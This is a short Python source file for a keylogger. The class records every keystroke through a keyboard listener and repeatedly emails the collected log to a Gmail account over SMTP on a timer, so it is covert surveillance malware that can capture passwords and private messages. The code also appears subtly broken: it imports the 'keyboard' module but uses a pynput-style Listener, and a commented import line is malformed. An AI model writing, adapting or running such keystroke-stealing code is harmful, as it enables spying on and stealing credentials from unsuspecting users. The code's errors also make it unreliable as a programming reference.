import smtplib as slib
import threading

import keyboard as keyboard
#from pynput input keyboard

class Keylogger:
    """Create the Keylogger class, define
    init variables"""

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger has started..."
        self.email = email
        self.password = password

    def append_to_log(self, string):
        """Create log which all keystrokes will append to"""
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting Program")
                return False
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        server = slib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


    def report_n_send(self):
        """ Create Report & Send Email"""
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()


    def start(self):
        """ Start KeyLogger and Send Off Emails"""
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()
